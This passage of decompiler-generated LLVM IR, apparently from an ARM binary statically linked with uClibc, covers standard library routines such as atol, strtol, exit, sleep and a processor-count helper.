  %v2_167a8 = icmp eq i32 %v0_167a8, 0
  br i1 %v2_167a8, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_167c412 = load i32, i32* @r7, align 4
  %v2_167c413 = inttoptr i32 %v1_167c412 to i32*
  store i32 0, i32* %v2_167c413, align 4
  %v1_167c8 = load i32, i32* @r4, align 4
  store i32 %v1_167c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167ec

.thread4:                                         ; preds = %bb26
  %v1_167ac = load i32, i32* @r5, align 4
  %v2_167ac = add i32 %v1_167ac, 4
  %v3_167ac = inttoptr i32 %v2_167ac to i32*
  %v4_167ac = load i32, i32* %v3_167ac, align 4
  %v1_167b0 = load i32, i32* @r6, align 4
  %v3_167b0 = sub i32 %v4_167ac, %v1_167b0
  %v4_167b4 = sdiv i32 %v3_167b0, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_167bc = mul i32 %v4_167b4, 5
  %v5_167bc = add i32 %v4_167bc, %v0_167a8
  store i32 %v5_167bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_167c4 = load i32, i32* @r7, align 4
  %v2_167c4 = inttoptr i32 %v1_167c4 to i32*
  store i32 0, i32* %v2_167c4, align 4
  %v1_167cc = load i32, i32* %r3.global-to-local, align 4
  %v2_167cc = load i32, i32* @r7, align 4
  %v3_167cc = inttoptr i32 %v2_167cc to i32*
  store i32 %v1_167cc, i32* %v3_167cc, align 4
  %v1_167f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167d4:                               ; preds = %dec_label_pc_16754
  %v0_167d4 = call i32 @__GI___errno_location()
  store i32 %v0_167d4, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_167dc = inttoptr i32 %v0_167d4 to i32*
  store i32 22, i32* %v2_167dc, align 4
  %v0_167e0 = call i32 @__GI___errno_location()
  %v0_167e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_167e4 = inttoptr i32 %v0_167e0 to i32*
  store i32 %v0_167e4, i32* %v2_167e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %bb27, %.thread4, %dec_label_pc_167d4
  %v1_167f4 = phi i32 [ %v1_167f4.pre, %.thread4 ], [ %v1_167c8, %bb27 ], [ -1, %dec_label_pc_167d4 ]
  store i32 %v3_1671c, i32* @r4, align 4
  store i32 %v6_1671c, i32* @r5, align 4
  ret i32 %v1_167f4

; uselistorder directives
  uselistorder i1 %v7_16764, { 1, 0 }
  uselistorder i1 %v7_1673c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2356), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_167ec, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_16810 = call i32 @strtol()
  ret i32 %v0_16810
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1682c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1682c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_16850 = load i32, i32* @r1, align 4
  store i32 %v0_16850, i32* %fp.global-to-local, align 4
  %v0_16854 = load i32, i32* @r2, align 4
  store i32 %v0_16854, i32* %r5.global-to-local, align 4
  %v0_16858 = load i32, i32* @r0, align 4
  store i32 %v0_16858, i32* %r4.global-to-local, align 4
  %v0_1685c = load i32, i32* @r3, align 4
  br label %dec_label_pc_16868

dec_label_pc_16864:                               ; preds = %dec_label_pc_16868
  %v1_16864 = add i32 %v0_168a0, 1
  store i32 %v1_16864, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16868

dec_label_pc_16868:                               ; preds = %entry, %dec_label_pc_16864
  %v0_168a0 = phi i32 [ %v0_16858, %entry ], [ %v1_16864, %dec_label_pc_16864 ]
  %v1_16868 = inttoptr i32 %v0_168a0 to i8*
  %v2_16868 = load i8, i8* %v1_16868, align 1
  %v3_16868 = zext i8 %v2_16868 to i32
  %v4_1686c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 744) to i32*), align 4
  store i32 %v4_1686c, i32* @r2, align 4
  %v2_16870 = mul nuw nsw i32 %v3_16868, 2
  %v2_16874 = add i32 %v2_16870, %v4_1686c
  %v3_16874 = inttoptr i32 %v2_16874 to i16*
  %v4_16874 = load i16, i16* %v3_16874, align 2
  %v1_16878 = and i16 %v4_16874, 32
  %v2_16878 = icmp eq i16 %v1_16878, 0
  br i1 %v2_16878, label %dec_label_pc_16880, label %dec_label_pc_16864

dec_label_pc_16880:                               ; preds = %dec_label_pc_16868
  %v7_16880 = icmp eq i8 %v2_16868, 43
  br i1 %v7_16880, label %dec_label_pc_168a0, label %dec_label_pc_16888

dec_label_pc_16888:                               ; preds = %dec_label_pc_16880
  %v7_16888 = icmp eq i8 %v2_16868, 45
  br i1 %v7_16888, label %dec_label_pc_168a0, label %bb

bb:                                               ; preds = %dec_label_pc_16888
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168a4

dec_label_pc_168a0:                               ; preds = %dec_label_pc_16880, %dec_label_pc_16888
  %storemerge47 = phi i32 [ 1, %dec_label_pc_16888 ], [ 0, %dec_label_pc_16880 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_168a0 = add i32 %v0_168a0, 1
  store i32 %v1_168a0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_168a4

dec_label_pc_168a4:                               ; preds = %bb, %dec_label_pc_168a0
  %v0_168c4 = phi i32 [ %v0_168a0, %bb ], [ %v1_168a0, %dec_label_pc_168a0 ]
  %v1_168a4 = and i32 %v0_16854, -17
  %v3_168a4 = icmp eq i32 %v1_168a4, 0
  br i1 %v3_168a4, label %dec_label_pc_168b0, label %bb60

bb60:                                             ; preds = %dec_label_pc_168a4
  br label %bb64

dec_label_pc_168b0:                               ; preds = %dec_label_pc_168a4
  %v1_168b0 = inttoptr i32 %v0_168c4 to i8*
  %v2_168b0 = load i8, i8* %v1_168b0, align 1
  %v7_168b4 = icmp eq i8 %v2_168b0, 48
  %v1_168b8 = add i32 %v0_16854, 10
  store i32 %v1_168b8, i32* %r5.global-to-local, align 4
  br i1 %v7_168b4, label %dec_label_pc_168c4, label %bb61

bb61:                                             ; preds = %dec_label_pc_168b0
  br label %.thread8

dec_label_pc_168c4:                               ; preds = %dec_label_pc_168b0
  %v1_168c4 = add i32 %v0_168c4, 1
  %v2_168c4 = inttoptr i32 %v1_168c4 to i8*
  %v3_168c4 = load i8, i8* %v2_168c4, align 1
  %v4_168c4 = zext i8 %v3_168c4 to i32
  store i32 %v1_168c4, i32* %r4.global-to-local, align 4
  %v1_168c8 = or i32 %v4_168c4, 32
  %v7_168cc = icmp eq i32 %v1_168c8, 120
  %v1_168d0 = add i32 %v0_16854, 8
  store i32 %v1_168d0, i32* %r5.global-to-local, align 4
  br i1 %v7_168cc, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_168c4
  %v3_168dc = mul i32 %v1_168d0, 2
  store i32 %v3_168dc, i32* %r5.global-to-local, align 4
  %v2_168e0 = add i32 %v0_168c4, 2
  store i32 %v2_168e0, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_168c4, %bb61, %bb62
  %v1_169ac30 = phi i32 [ %v0_16858, %bb61 ], [ %v1_168c4, %bb62 ], [ %v1_168c4, %dec_label_pc_168c4 ]
  %v0_1693021 = phi i32 [ %v0_168c4, %bb61 ], [ %v2_168e0, %bb62 ], [ %v1_168c4, %dec_label_pc_168c4 ]
  %v0_168e4 = phi i32 [ %v1_168b8, %bb61 ], [ %v3_168dc, %bb62 ], [ %v1_168d0, %dec_label_pc_168c4 ]
  %v5_168e8 = icmp slt i32 %v0_168e4, 16
  br i1 %v5_168e8, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_169ac29 = phi i32 [ %v0_16858, %bb60 ], [ %v1_169ac30, %.thread8 ], [ %v1_169ac30, %bb63 ]
  %v0_1693020 = phi i32 [ %v0_168c4, %bb60 ], [ %v0_1693021, %.thread8 ], [ %v0_1693021, %bb63 ]
  %v0_16910 = phi i32 [ %v0_16854, %bb60 ], [ %v0_168e4, %.thread8 ], [ 16, %bb63 ]
  %v1_168ec = add i32 %v0_16910, -2
  %tmp = icmp ugt i32 %v1_168ec, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_168fc

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_169a8

dec_label_pc_168fc:                               ; preds = %bb64
  %v2_16904 = udiv i32 -1, %v0_16910
  %v3_16904 = urem i32 -1, %v0_16910
  %v1_16914 = urem i32 %v3_16904, 256
  store i32 %v1_16914, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_16904, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_16930

dec_label_pc_1692c:                               ; preds = %bb71, %dec_label_pc_1698c
  %v0_1692c = phi i32 [ %v1_1696c44, %bb71 ], [ %v0_1692c.pre, %dec_label_pc_1698c ]
  br label %dec_label_pc_16930

dec_label_pc_16930:                               ; preds = %dec_label_pc_168fc, %dec_label_pc_1692c
  %v1_169ac27 = phi i32 [ %v1_169ac29, %dec_label_pc_168fc ], [ %v0_1692c, %dec_label_pc_1692c ]
  %v0_1696c = phi i32 [ %v0_1693020, %dec_label_pc_168fc ], [ %v0_1692c, %dec_label_pc_1692c ]
  %v1_16930 = inttoptr i32 %v0_1696c to i8*
  %v2_16930 = load i8, i8* %v1_16930, align 1
  %v3_16930 = zext i8 %v2_16930 to i32
  %v1_16934 = add nsw i32 %v3_16930, -48
  %v1_16938 = urem i32 %v1_16934, 256
  %v1_16940 = or i32 %v3_16930, 32
  store i32 %v1_16940, i32* @r2, align 4
  %tmp79 = icmp ult i32 %v1_16938, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_16948

dec_label_pc_16948:                               ; preds = %dec_label_pc_16930
  %v1_1694c = add nsw i32 %v1_16940, -87
  store i32 %v1_1694c, i32* @r2, align 4
  %tmp80 = icmp ugt i32 %v1_16940, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_16948
  %v5_16954 = urem i32 %v1_1694c, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16930, %dec_label_pc_16948, %bb65
  %v3_16984 = phi i32 [ %v1_16938, %dec_label_pc_16930 ], [ 40, %dec_label_pc_16948 ], [ %v5_16954, %bb65 ]
  %v1_16958 = load i32, i32* %r5.global-to-local, align 4
  %v6_1695c = icmp slt i32 %v3_16984, %v1_16958
  br i1 %v6_1695c, label %dec_label_pc_16960, label %dec_label_pc_169a8.loopexit

dec_label_pc_16960:                               ; preds = %bb66
  %v0_16960 = load i32, i32* @ip, align 4
  %v1_16960 = load i32, i32* %r8.global-to-local, align 4
  %v9_16960 = icmp eq i32 %v0_16960, %v1_16960
  br i1 %v9_16960, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_16960
  %v1_1696c40 = add i32 %v0_1696c, 1
  store i32 %v1_1696c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16974

bb67:                                             ; preds = %dec_label_pc_16960
  %v3_16960 = icmp ult i32 %v0_16960, %v1_16960
  %v1_1696c = add i32 %v0_1696c, 1
  store i32 %v1_1696c, i32* %r4.global-to-local, align 4
  br i1 %v3_16960, label %dec_label_pc_16974, label %dec_label_pc_1698c

dec_label_pc_16974:                               ; preds = %bb67, %.thread39
  %v1_1696c44 = phi i32 [ %v1_1696c40, %.thread39 ], [ %v1_1696c, %bb67 ]
  %v4_1697c2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_16974 = load i32, i32* %sl.global-to-local, align 4
  %v3_16974 = icmp uge i32 %v3_16984, %v1_16974
  %v9_16974 = icmp eq i32 %v3_16984, %v1_16974
  %v2_16978 = xor i1 %v3_16974, true
  %v3_16978 = or i1 %v9_16974, %v2_16978
  br i1 %v3_16978, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_16974
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_16974, %bb68
  %v4_1697c = phi i32 [ %v4_1697c2443, %dec_label_pc_16974 ], [ 0, %bb68 ]
  %v2_1697c = xor i1 %v9_16974, true
  %v3_1697c = and i1 %v3_16974, %v2_1697c
  br i1 %v3_1697c, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_1697c = urem i32 %v4_1697c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_16980 = phi i32 [ %v5_1697c, %bb70 ], [ %v4_1697c, %bb69 ]
  %v2_16980 = icmp eq i32 %v0_16980, 0
  br i1 %v2_16980, label %bb71, label %dec_label_pc_1698c

bb71:                                             ; preds = %thread-pre-split
  %v4_16984 = mul i32 %v0_16960, %v1_16958
  %v5_16984 = add i32 %v4_16984, %v3_16984
  store i32 %v5_16984, i32* @ip, align 4
  br label %dec_label_pc_1692c

dec_label_pc_1698c:                               ; preds = %bb67, %thread-pre-split
  %v0_1698c = call i32 @__GI___errno_location()
  %v0_16994 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16994, i32* @ip, align 4
  %v0_16998 = load i32, i32* %r7.global-to-local, align 4
  %v2_16998 = and i32 %v0_16998, %v0_1685c
  store i32 %v2_16998, i32* %r7.global-to-local, align 4
  %v2_169a0 = inttoptr i32 %v0_1698c to i32*
  store i32 34, i32* %v2_169a0, align 4
  %v0_1692c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1692c

dec_label_pc_169a8.loopexit:                      ; preds = %bb66
  %v0_169a8.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_169a8

dec_label_pc_169a8:                               ; preds = %.thread, %dec_label_pc_169a8.loopexit
  %v1_169ac = phi i32 [ %v1_169ac27, %dec_label_pc_169a8.loopexit ], [ %v1_169ac29, %.thread ]
  %v2_169ac = phi i32 [ %v0_169a8.pre, %dec_label_pc_169a8.loopexit ], [ %v0_16850, %.thread ]
  %v2_169a8 = icmp eq i32 %v2_169ac, 0
  br i1 %v2_169a8, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_169a8
  %v3_169ac = inttoptr i32 %v2_169ac to i32*
  store i32 %v1_169ac, i32* %v3_169ac, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_169a8, %bb72
  %v0_169b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_169b4 = icmp eq i32 %v0_169b4, 0
  %. = select i1 %v2_169b4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_169c0 = icmp eq i32 %v0_1685c, 0
  %v0_169e4.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_169c0, label %dec_label_pc_169dc, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_169e4.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_169cc, label %dec_label_pc_169dc

dec_label_pc_169cc:                               ; preds = %bb76
  %v0_169cc = call i32 @__GI___errno_location()
  %v2_169d4 = inttoptr i32 %v0_169cc to i32*
  store i32 34, i32* %v2_169d4, align 4
  %v0_169d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_169d8, i32* @ip, align 4
  %v0_169dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_169dc

dec_label_pc_169dc:                               ; preds = %bb76, %bb73, %dec_label_pc_169cc
  %v0_169e4.pre = phi i32 [ %v0_169e4.pre.pre, %bb76 ], [ %v0_169d8, %dec_label_pc_169cc ], [ %v0_169e4.pre.pre, %bb73 ]
  %v0_169dc = phi i32 [ %v0_169b4, %bb76 ], [ %v0_169dc.pre, %dec_label_pc_169cc ], [ %v0_169b4, %bb73 ]
  %v2_169dc = icmp eq i32 %v0_169dc, 0
  br i1 %v2_169dc, label %dec_label_pc_169dc._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_169dc
  %v2_169e0 = sub i32 0, %v0_169e4.pre
  store i32 %v2_169e0, i32* @ip, align 4
  br label %dec_label_pc_169dc._crit_edge

dec_label_pc_169dc._crit_edge:                    ; preds = %dec_label_pc_169dc, %bb77
  %v0_169e4 = phi i32 [ %v2_169e0, %bb77 ], [ %v0_169e4.pre, %dec_label_pc_169dc ]
  ret i32 %v0_169e4

; uselistorder directives
  uselistorder i32 %v0_169e4.pre, { 1, 0 }
  uselistorder i32 %v0_169e4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1697c, { 1, 0 }
  uselistorder i1 %v3_16974, { 1, 0 }
  uselistorder i32 %v1_16974, { 1, 0 }
  uselistorder i32 %v1_16938, { 1, 0 }
  uselistorder i32 %v0_1696c, { 1, 0, 2 }
  uselistorder i32 %v0_1692c, { 1, 0 }
  uselistorder i32 %v3_168dc, { 1, 0 }
  uselistorder i32 %v1_168d0, { 1, 0, 2 }
  uselistorder i32 %v0_168c4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_168a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1685c, { 1, 0 }
  uselistorder i32 %v0_16858, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16854, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_169dc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_169dc, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_169a8, { 1, 0 }
  uselistorder label %dec_label_pc_1698c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16930, { 1, 0 }
  uselistorder label %dec_label_pc_1692c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_168a4, { 1, 0 }
  uselistorder label %dec_label_pc_168a0, { 1, 0 }
  uselistorder label %dec_label_pc_16868, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  %v4_16a08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 96) to i32*), align 4
  store i32 %v4_16a08, i32* @r4, align 4
  %v2_16a10 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_16a28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16a28)
  %v0_16a3c = load i32, i32* @r5, align 4
  %v2_16a3c = add i32 %v0_16a3c, 20
  %v3_16a3c = inttoptr i32 %v2_16a3c to i32*
  %v4_16a3c = load i32, i32* %v3_16a3c, align 4
  call void @__pseudo_branch(i32 %v4_16a3c)
  %v0_16a4c = load i32, i32* @r5, align 4
  %v2_16a4c = add i32 %v0_16a4c, 26488
  %v3_16a4c = inttoptr i32 %v2_16a4c to i32*
  %v4_16a4c = load i32, i32* %v3_16a4c, align 4
  %v2_16a50 = icmp eq i32 %v4_16a4c, 0
  br i1 %v2_16a50, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_16a5c = xor i1 %v2_16a50, true
  call void @__pseudo_cond_branch(i1 %v2_16a5c, i32 %v4_16a4c)
  store i32 %v2_16a10, i32* @r0, align 4
  %v0_16a6c = load i32, i32* @r5, align 4
  %v2_16a6c = add i32 %v0_16a6c, 28
  %v3_16a6c = inttoptr i32 %v2_16a6c to i32*
  %v4_16a6c = load i32, i32* %v3_16a6c, align 4
  call void @__pseudo_branch(i32 %v4_16a6c)
  %v0_16a78 = call i32 @__GI___uClibc_fini()
  %v0_16a80 = load i32, i32* @r5, align 4
  %v2_16a80 = add i32 %v0_16a80, -87992
  %v9_16a80 = icmp eq i32 %v2_16a80, 0
  br i1 %v9_16a80, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_16a88 = xor i1 %v9_16a80, true
  call void @__pseudo_cond_branch(i1 %v2_16a88, i32 %v2_16a80)
  %v0_16a8c = load i32, i32* @r6, align 4
  %v1_16a90 = call i32 @__GI__exit(i32 %v0_16a8c)
  %v0_16a94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16a94, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_16a94 = load i32, i32* @r1, align 4
  %v2_16a94 = load i32, i32* @r4, align 4
  %v5_16a94 = mul i32 %v2_16a94, 4096
  %v6_16a94 = and i32 %v5_16a94, %v1_16a94
  store i32 %v6_16a94, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_16aac = phi i32 [ %v1_16a90, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_16aac

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_16ab4 = load i32, i32* @r4, align 4
  %v6_16ab4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_16ab8 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_16ab8, label %dec_label_pc_16b4c, label %dec_label_pc_16ac8

dec_label_pc_16ac8:                               ; preds = %entry
  %v2_16ad8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_16aec = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_16ad8)
  %v3_16af0 = load i32, i32* %stack_var_-44, align 4
  %v7_16af4 = icmp eq i32 %v3_16af0, 1
  br i1 %v7_16af4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16ac8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16ac8, %bb
  call void @__pseudo_cond_branch(i1 %v7_16af4, i32 ptrtoint (i32* @global_var_120cc.1205 to i32))
  %v2_16b08 = ptrtoint i32* %stack_var_-16 to i32
  %v2_16b10 = call i32 @__libc_nanosleep(i32 %v2_16b08, i32 %v2_16b08)
  %v2_16b14 = icmp eq i32 %v2_16b10, 0
  br i1 %v2_16b14, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_16b28 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_16b28, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_16b38 = load i32, i32* %stack_var_-24, align 4
  %v1_16b3c = and i32 %v3_16b38, 65536
  %v2_16b3c = icmp eq i32 %v1_16b3c, 0
  br i1 %v2_16b3c, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_16b3c, i32 ptrtoint (i32* @global_var_120cc.1205 to i32))
  %v0_16b4c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16b4c

dec_label_pc_16b4c:                               ; preds = %entry, %.thread6
  %v0_16b4c = phi i32 [ %v0_16b4c.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_16ab4, i32* @r4, align 4
  store i32 %v6_16ab4, i32* @lr, align 4
  ret i32 %v0_16b4c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16b4c, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2316), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_16b80 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2316))
  store i32 %v1_16b80, i32* @r6, align 4
  %v2_16b84 = icmp eq i32 %v1_16b80, 0
  br i1 %v2_16b84, label %dec_label_pc_16c04, label %dec_label_pc_16b8c

dec_label_pc_16b8c:                               ; preds = %entry
  store i32 744, i32* @sl, align 4
  %v0_16b94 = load i32, i32* @r4, align 4
  %v2_16b94 = add i32 %v0_16b94, -2304
  store i32 %v2_16b94, i32* @r8, align 4
  %v2_16b98 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16b98, i32* @r7, align 4
  br label %bb18

dec_label_pc_16ba0:                               ; preds = %bb18
  %v3_16ba0 = load i32, i32* %stack_var_-36, align 4
  %v1_16ba4 = inttoptr i32 %v3_16ba0 to i32*
  %v2_16ba4 = load i32, i32* %v1_16ba4, align 4
  %v1_16ba8 = inttoptr i32 %v2_16ba4 to i8*
  %v2_16ba8 = load i8, i8* %v1_16ba8, align 1
  %v7_16bac = icmp eq i8 %v2_16ba8, 99
  br i1 %v7_16bac, label %dec_label_pc_16bb4, label %.backedge3

dec_label_pc_16bb4:                               ; preds = %dec_label_pc_16ba0
  %v1_16bb4 = add i32 %v2_16ba4, 1
  %v2_16bb4 = inttoptr i32 %v1_16bb4 to i8*
  %v3_16bb4 = load i8, i8* %v2_16bb4, align 1
  %v7_16bb8 = icmp eq i8 %v3_16bb4, 112
  br i1 %v7_16bb8, label %dec_label_pc_16bc0, label %.backedge3

dec_label_pc_16bc0:                               ; preds = %dec_label_pc_16bb4
  %v1_16bc0 = add i32 %v2_16ba4, 2
  %v2_16bc0 = inttoptr i32 %v1_16bc0 to i8*
  %v3_16bc0 = load i8, i8* %v2_16bc0, align 1
  %v7_16bc4 = icmp eq i8 %v3_16bc0, 117
  br i1 %v7_16bc4, label %dec_label_pc_16bcc, label %.backedge3

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16bc0
  %v1_16bcc = add i32 %v2_16ba4, 3
  %v2_16bcc = inttoptr i32 %v1_16bcc to i8*
  %v3_16bcc = load i8, i8* %v2_16bcc, align 1
  %v4_16bcc = zext i8 %v3_16bcc to i32
  %v0_16bd0 = load i32, i32* @r4, align 4
  %v1_16bd0 = load i32, i32* @sl, align 4
  %v2_16bd0 = add i32 %v1_16bd0, %v0_16bd0
  %v3_16bd0 = inttoptr i32 %v2_16bd0 to i32*
  %v4_16bd0 = load i32, i32* %v3_16bd0, align 4
  %v2_16bd4 = mul nuw nsw i32 %v4_16bcc, 2
  %v2_16bd8 = add i32 %v4_16bd0, %v2_16bd4
  %v3_16bd8 = inttoptr i32 %v2_16bd8 to i16*
  %v4_16bd8 = load i16, i16* %v3_16bd8, align 2
  %v1_16bdc = and i16 %v4_16bd8, 8
  %v2_16bdc = icmp eq i16 %v1_16bdc, 0
  br i1 %v2_16bdc, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_16bcc
  %v1_16be0 = load i32, i32* @r5, align 4
  %v2_16be0 = add i32 %v1_16be0, 1
  store i32 %v2_16be0, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_16bcc, %dec_label_pc_16ba0, %dec_label_pc_16bb4, %dec_label_pc_16bc0
  %v0_16be4.pre = load i32, i32* @r6, align 4
  %v0_16bf0.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_16b8c
